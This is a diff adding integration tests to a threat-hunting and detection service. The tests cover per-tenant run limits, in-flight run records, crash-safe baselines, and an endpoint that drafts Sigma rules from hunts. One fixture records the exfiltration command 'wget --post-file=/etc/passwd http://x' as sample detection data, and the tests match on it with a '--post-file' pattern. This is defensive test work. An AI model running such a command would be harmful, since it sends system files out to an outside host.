@@ -11,6 +11,7 @@ import { createTenantHeaders } from "../helpers/http";
 import { GET as listHunts, POST as createHunt } from "@/app/api/hunts/route";
 import { DELETE as deleteHunt, GET as getHunt, PATCH as patchHunt } from "@/app/api/hunts/[id]/route";
 import { POST as runHuntRoute } from "@/app/api/hunts/[id]/run/route";
+import { POST as graduateHunt } from "@/app/api/hunts/[id]/graduate/route";
 import { GET as runHuntsCron } from "@/app/api/cron/run-hunts/route";
 import {
   HUNT_RUNS_KEPT,
@@ -242,6 +243,66 @@ describe("saved hunts (real database)", () => {
     expect((await runHuntRoute(req(`/api/hunts/${theirs.id}/run`, other.id, "POST"), ctx(theirs.id))).status).toBe(200);
   });
 
+  it("bounds parallel manual runs too: simultaneous requests start exactly the allowance and 429 the rest", async () => {
+    // The limit used to count finished rows, and a run's row was written when it ended, so
+    // N requests sent together all saw the count before any finished and all ran.
+    const tenant = await createTestTenant();
+    const hunt = await create(tenant.id);
+    const parallel = MAX_RUNS_PER_TENANT_PER_MINUTE + 10;
+
+    const responses = await Promise.all(
+      Array.from({ length: parallel }, () =>
+        runHuntRoute(req(`/api/hunts/${hunt.id}/run`, tenant.id, "POST"), ctx(hunt.id))
+      )
+    );
+    const statuses = responses.map((r) => r.status);
+
+    expect(statuses.filter((s) => s === 200)).toHaveLength(MAX_RUNS_PER_TENANT_PER_MINUTE);
+    expect(statuses.filter((s) => s === 429)).toHaveLength(10);
+    expect(await prisma.huntRun.count({ where: { tenantId: tenant.id } })).toBe(MAX_RUNS_PER_TENANT_PER_MINUTE);
+  }, 30_000);
+
+  it("writes a run's row when it starts, so a run in flight is counted and visible, and finishes it afterwards", async () => {
+    const tenant = await createTestTenant();
+    const hunt = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "slow", query } });
+
+    const running = runHunt(prisma, hunt, "manual", new Date(), {
+      beforeQuery: (tx) => tx.$executeRaw(Prisma.sql`SELECT pg_sleep(1)`),
+    });
+    await new Promise((r) => setTimeout(r, 400));
+    const inFlight = await prisma.huntRun.findMany({ where: { huntId: hunt.id } });
+    expect(inFlight).toHaveLength(1);
+    expect(inFlight[0].finishedAt).toBeNull();
+    expect(inFlight[0].error).toBeNull();
+
+    const done = await running;
+    expect(done.id).toBe(inFlight[0].id);
+    expect(done.finishedAt).not.toBeNull();
+    expect(await prisma.huntRun.count({ where: { huntId: hunt.id } })).toBe(1);
+  }, 15_000);
+
+  it("does not take a run that never finished (the server died mid-run) for the previous run", async () => {
+    const tenant = await createTestTenant();
+    const a = await createTestAgent(tenant.id);
+    const hunt = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "h", query } });
+    const pause = () => new Promise((r) => setTimeout(r, 25));
+
+    await createTestDetection(tenant.id, a.id, { technique: "T1059.001" });
+    await pause();
+    expect(await runHunt(prisma, hunt, "manual")).toMatchObject({ matchCount: 1, newMatchCount: 1 });
+    await pause();
+    await createTestDetection(tenant.id, a.id, { technique: "T1059.004" });
+    await pause();
+    // A run that started after that detection and was killed before it stored anything.
+    await prisma.huntRun.create({
+      data: { huntId: hunt.id, tenantId: tenant.id, queryVersion: 1, query, sampleDetectionIds: [], trigger: "manual" },
+    });
+    await pause();
+
+    // The baseline is the last run that produced a result, so the second detection is new.
+    expect(await runHunt(prisma, hunt, "manual")).toMatchObject({ matchCount: 2, newMatchCount: 1 });
+  });
+
   it("the cron runs only due scheduled hunts, and prunes history", async () => {
     const tenant = await createTestTenant();
     const never = await create(tenant.id, { scheduleMinutes: 60 });
@@ -292,4 +353,62 @@ describe("saved hunts (real database)", () => {
     expect((await deleteHunt(req(`/api/hunts/${hunt.id}`, tenant.id, "DELETE"), ctx(hunt.id))).status).toBe(204);
     expect(await prisma.huntRun.count()).toBe(0);
   });
+
+describe("POST /api/hunts/[id]/graduate (#618)", () => {
+  const execEvent = (image: string, cmdline: string) => ({ type: "exec", image_path: image, cmdline });
+  const graduate = (id: string, tenantId: string, body: unknown) =>
+    graduateHunt(req(`/api/hunts/${id}/graduate`, tenantId, "POST", body), ctx(id));
+
+  async function huntWithRun(tenantId: string, queryExtra: Record<string, unknown> = {}) {
+    const agent = await createTestAgent(tenantId);
+    await createTestDetection(tenantId, agent.id, {
+      technique: "T1048",
+      severity: "high",
+      timestamp: new Date(Date.now() - HOUR),
+      event: execEvent("/usr/bin/wget", "wget --post-file=/etc/passwd http://x"),
+    });
+    const hunt = await create(tenantId, { name: "Wget upload", query: { version: 1, lastHours: 24, text: "--post-file", ...queryExtra } });
+    return hunt;
+  }
+
+  it("answers a reviewable draft from the newest finished run, and writes nothing", async () => {
+    const tenant = await createTestTenant();
+    const hunt = await huntWithRun(tenant.id);
+    expect((await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, tenant.id, "POST"), ctx(hunt.id))).status).toBe(200);
+
+    const res = await graduate(hunt.id, tenant.id, { platform: "linux" });
+    expect(res.status).toBe(200);
+    const body = await res.json();
+    expect(body.files.map((f: { path: string }) => f.path)).toEqual([
+      "rules/sigma/linux/wget_upload.yml",
+      "rules/sigma/linux/wget_upload.samples.json",
+    ]);
+    expect(body.files[0].content).toContain("Image|endswith: '/wget'");
+    expect(body.files[0].content).toContain("attack.t1048");
+    expect(body.todo.length).toBeGreaterThan(0);
+  });
+
+  it("says why when the hunt has not run, and when no draft can be made", async () => {
+    const tenant = await createTestTenant();
+    const hunt = await huntWithRun(tenant.id);
+    const early = await graduate(hunt.id, tenant.id, { platform: "linux" });
+    expect(early.status).toBe(422);
+    expect((await early.json()).error).toMatch(/no finished run/);
+
+    await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, tenant.id, "POST"), ctx(hunt.id));
+    const noText = await huntWithRun(tenant.id, { text: undefined });
+    await runHuntRoute(req(`/api/hunts/${noText.id}/run`, tenant.id, "POST"), ctx(noText.id));
+    const refused = await graduate(noText.id, tenant.id, { platform: "linux" });
+    expect(refused.status).toBe(422);
+    expect((await refused.json()).problems.join(" ")).toMatch(/negative/);
+  });
+
+  it("is a 400 for a bad body and a 404 for another tenant's hunt", async () => {
+    const tenant = await createTestTenant();
+    const other = await createTestTenant();
+    const hunt = await huntWithRun(tenant.id);
+    expect((await graduate(hunt.id, tenant.id, { platform: "bsd" })).status).toBe(400);
+    expect((await graduate(hunt.id, other.id, { platform: "linux" })).status).toBe(404);
+  });
+});
 });
